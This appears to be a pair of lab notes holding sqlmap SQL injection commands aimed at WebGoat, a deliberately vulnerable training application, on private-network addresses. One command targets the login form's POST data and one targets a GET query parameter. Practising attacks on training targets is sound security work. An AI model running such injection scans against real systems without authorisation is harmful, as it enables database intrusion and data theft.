# WebGoat login endpoint

sqlmap -u "http://172.20.10.2:8080/WebGoat/login" \
 --data="username=admin&password=test" \
 --level=3 --risk=2 --batch

# GET parameter

sqlmap -u "http://172.20.10.3:8080/WebGoat/SqlInjection/attack?query=test" \
 --batch --level=2
